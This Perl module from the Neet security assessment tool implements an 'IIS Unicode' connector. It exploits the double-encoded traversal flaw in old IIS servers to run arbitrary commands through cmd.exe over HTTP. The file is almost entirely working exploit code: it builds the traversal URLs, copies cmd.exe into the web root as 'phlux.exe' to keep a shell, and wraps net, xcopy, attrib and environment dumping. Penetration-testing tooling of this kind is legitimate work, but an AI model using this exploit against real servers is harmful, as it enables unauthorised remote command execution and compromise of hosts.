##########################################################################
#
#    Neet: Network discovery, enumeration and security assessment tool
#    Copyright (C) 2008-2014 Jonathan Roach
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#    Contact: jonnyhightower [at] funkygeek.com
#
##########################################################################

# JR::ConnectorIISUnicode.pm

# This is the "IIS Unicode" connector for the ishell command shell framework.
# Jonathan Roach

# It uses HTTP/HTTPS to obtain command execution on vulnerable hosts.

# All connectors should provide the same base interface to the calling iShell.
# new		-> create a new instance of the connector. This should only return a connector object
#		   if the initial connection succeeds
# test		-> test for command shell capabilities. Should return 1 for "yes, we have a shell" or
# 		   otherwise 0
# execute	-> execute this system command - returns an array of output
# ServerTime	-> get the date/time from the server
# OS		-> get the OS version
# Server	-> get the Server version
# Args		-> return a hash of parameters that should be supplied.
# BaseDir	-> get the directory that the exploited service is based
# Environment	-> get a hash of the environment variables
# disconnect	-> Close the connection


use strict;

package JR::iShell::ConnectorIISUnicode;
use IO::Socket;
use JR::Parsers::OutputIsolator;

sub new {
	my $PKG=shift();
	my %IISServer=@_;
	my %Connector;

	my %RequiredArgs;
	$RequiredArgs{'Args'}="Host Port SSL";
	$RequiredArgs{'Optional'}="Host Port SSL";
	$RequiredArgs{'Mandatory'}="";
	$RequiredArgs{'Defaults'}{'Host'}="127.0.0.1";
	$RequiredArgs{'Defaults'}{'Port'}="80";
	$RequiredArgs{'Defaults'}{'SSL'}="0";

	$IISServer{"Host"}="$RequiredArgs{'Defaults'}{'Host'}" if (!$IISServer{"Host"});
	$IISServer{"Port"}="$RequiredArgs{'Defaults'}{'Port'}" if (!$IISServer{"Port"});
	$IISServer{'SSL'}="$RequiredArgs{'Defaults'}{'SSL'}" if (!$IISServer{"SSL"});

	$IISServer{'Type'}="Windows";
	$IISServer{'SysPath'}="..%255c..%255c..%255cwinnt/system32/";	
	$IISServer{'Path'}=$IISServer{'SysPath'};
	$IISServer{'CommandInterpreter'}="cmd.exe";
	$IISServer{'RequiredArgs'}=\%RequiredArgs;

	$IISServer{'HTMLobj'}=new OutputIsolator();
	my $ConnectorObject=\%IISServer;
	bless $ConnectorObject, $PKG;
	return $ConnectorObject;
}

sub test {
	my $IISServer=shift();
	my $OutputIsolator=$$IISServer{'HTMLobj'};
	my $teststring="__OutputIsolatorCalibration__OICalibrate__"x3;
	for (my $a=0; $a<10; $a++){
		# This is not required to be cryptographically strong!! :-)
		$teststring .= int(rand(1000));
	}
	print "Calibrating...\n";
	until ($OutputIsolator->isCalibrated){
		$OutputIsolator->LoadPage($IISServer->_subSubmit("echo $teststring"));
		$OutputIsolator->Calibrate("$teststring");
	}
	#print "Calibrated at " . $$OutputIsolator{'Index'} . "\n";
	my $Base=$IISServer->BaseDir;
	$$IISServer{'Base'}=$Base;	
	
	# Now get a command shell we can use
	my $tempshell="phlux.exe";
	print "Getting our own command shell...\n";
	$IISServer->execute("if exist $Base\\tmp.exe del $Base\\tmp.exe");
	$IISServer->execute("copy C:\\winnt\\system32\\cmd.exe $Base\\$tempshell");
	my @results=$IISServer->execute("dir");
	my $ok=0;
	for my $line (@results){
		if ($line =~ /\s$tempshell$/){
			$ok=1;
		}
	}
	if ($ok){
		$$IISServer{'Path'}="";
		$$IISServer{'CommandInterpreter'}="$tempshell";
	}
	return $ok;
}

sub execute {
	my $IISServer=shift();
	my $OutputIsolator=$$IISServer{'HTMLobj'};
	my $fullcommand=shift();
	my $exe=$$IISServer{'CommandInterpreter'};
	my $path=$$IISServer{'Path'};
	my @commands = split "&&", $fullcommand;
	my @newcommand;
	for my $command (@commands){
		$command =~ s/^\s+//;
		if ($command =~ /xcopy /){
			$exe="xcopy.exe";
			$path=$$IISServer{'SysPath'};
			$command =~ s/xcopy //;
			pop @newcommand;
		}
		if ($command =~ /net /){
			$exe="net.exe";
			$path=$$IISServer{'SysPath'};
			$command =~ s/net //;
			pop @newcommand;
		}
		if ($command =~ /net1 /){
			$exe="net1.exe";
			$path=$$IISServer{'SysPath'};
			$command =~ s/net1 //;
			pop @newcommand;
		}
		if ($command =~ /attrib /){
			$exe="attrib.exe";
			$path=$$IISServer{'SysPath'};
			$command =~ s/attrib //;
			pop @newcommand;
		}
		push @newcommand, $command;
	}
	my $command=join "&& ", @newcommand;
	$command = "/c+" . $command if (("$exe" eq "$$IISServer{'CommandInterpreter'}") || ("$exe" eq "cmd.exe"));
	$exe = $path . $exe;
	my $cmd="/scripts/" . $exe . "?$command";
	my @res=$IISServer->httpget($cmd);
	$OutputIsolator->LoadPage(@res);
	my @results=$OutputIsolator->GetOutput;
	return @results;
}

sub _subSubmit {
	my $IISServer=shift();
	my $command=shift();
	my $exe=$$IISServer{'Path'} . $$IISServer{'CommandInterpreter'};
	my $cmd="/scripts/" . $exe . "?/c+$command";
	my @result=$IISServer->httpget($cmd);
	return @result;
}

sub ServerTime {
	my $OBJ=shift();
	return $$OBJ{'Date'};
}

sub OS {
	my $OBJ=shift();
	my @result=$OBJ->execute("ver");
	return $result[1];
}

sub Args {
	my $OBJ=shift();
	return %{$$OBJ{'RequiredArgs'}};
}

sub Server {
	my $OBJ=shift();
	return $$OBJ{'Server'};
}

sub BaseDir {
	my $OBJ=shift();
	my @result=$OBJ->execute("cd");
	return $result[0];
}

sub Environment {
	my $OBJ=shift();
	my @result=$OBJ->execute("set");
	my %env;
	for my $line (@result){
		next if (!$line);
		my ($var,$val)=split "=", $line;
		$env{$var}=$val;
	}
	return %env;
}

sub disconnect {
	my $OBJ=shift();
	return 1;
}

sub close {
	my $OBJ=shift();
	return disconnect($OBJ);
}

sub httpget {
	my $IISServer=shift();
	my $Host=$$IISServer{'Host'};
	my $Port=$$IISServer{'Port'};
	my $cmd = urlencode(shift());
	my $headercount=0; my $timeout=10; my $tries=0;
	my $headers="Connection: Keep-Alive\r\n";
	my @output;
	while (!$headercount){
		$tries++;
		my $socket = IO::Socket::INET->new('PeerAddr'=>"$Host", 'PeerPort'=>"$Port", 'Proto'=>'tcp', 'Blocking'=>'1', 'Timeout'=>'10');
		print $socket "GET $cmd HTTP/1.1\r\nHost: $Host\r\n$headers\r\n";
		my @raw=<$socket>;
		$socket->close;
		my $head=1;
		for my $line (@raw){
			if ($line !~ /\S/){
				$head=0;
				next;
			}
			if ($head){
				$headercount++;
				if ($line =~ /^Server: /){
					$line =~ s/[\r\n]//g;
					$$IISServer{'Server'}=substr($line,index($line," ")+1,length($line)-index($line," "));
				}
				if ($line =~ /^Date: /){
					$line =~ s/[\r\n]//g;
					$$IISServer{'Date'}=substr($line,index($line," ")+1,length($line)-index($line," "));
				}
			} else {
				push @output, $line;
			}
		}
		if ($tries > $timeout) {
			print STDERR ("Couldn't get HTTP response\n");
			sleep 5;
			return undef;
		}
	}
	return @output;
}

sub urlencode {
	my $string=shift();
	$string =~ s/ /%20/g;
	$string =~ s/&/%26/g;
	return $string;
}


sub register {
	# Gets called at installation time 
	eval {
		require JR::Catalog;
	};
	if ($@){
		print STDERR "Couldn't load JR::Catalog. Didn't register.\n";
		return 0;
	}
	my $reg=Catalog->new;
	if (!$reg->isRegistered("Module"=>"ConnectorIISUnicode")){
		return $reg->Register("Type"=>"iShellConnector","Object"=>"IISUnicode","Module"=>"ConnectorIISUnicode");
	}
	return 0;
}

1;


